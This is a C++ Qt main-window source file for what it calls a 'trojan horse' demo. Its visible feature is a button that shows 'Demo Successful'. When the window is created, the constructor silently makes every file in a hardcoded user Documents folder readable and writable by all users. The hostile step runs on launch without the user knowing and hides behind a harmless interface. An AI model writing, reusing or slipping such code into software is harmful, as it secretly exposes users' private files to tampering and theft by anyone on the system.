#include "mainwindow.h"
#include "ui_mainwindow.h"
#include <qmessagebox.h>
#include <QCoreApplication>
#include <QDir>
#include <QFile>
#include <QFileInfo>
#include <QTextStream>
#include <qdebug.h>

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    //create trojan horse
    const QString desktopPath = "/home/sadam/Documents";
    QDir desktopDir(desktopPath);

    if (!desktopDir.exists()) {
        qDebug() << "Error: Directory does not exist.";
    }

    QStringList files = desktopDir.entryList(QDir::Files | QDir::NoDotAndDotDot);
    foreach (const QString &file, files) {
        QString filePath = desktopPath + "/" + file;
        QFileInfo fileInfo(filePath);

        if (!fileInfo.isFile()) {
            qDebug() << "Skipped: " << fileInfo.fileName() << " is not a regular file.";
            continue;
        }

        QFile file_(filePath);
        if (!file_.setPermissions(QFile::ReadUser | QFile::WriteUser | QFile::ReadGroup | QFile::WriteGroup | QFile::ReadOther | QFile::WriteOther)) {
            qDebug() << "Error changing file permissions for" << fileInfo.fileName();
        } else {
            qDebug() << "Read and write access granted to" << fileInfo.fileName();
        }
    }
}

MainWindow::~MainWindow()
{
    delete ui;
}


void MainWindow::on_pushButton_clicked()
{
    QMessageBox::information(this,"Info","Demo Successful",0);
}

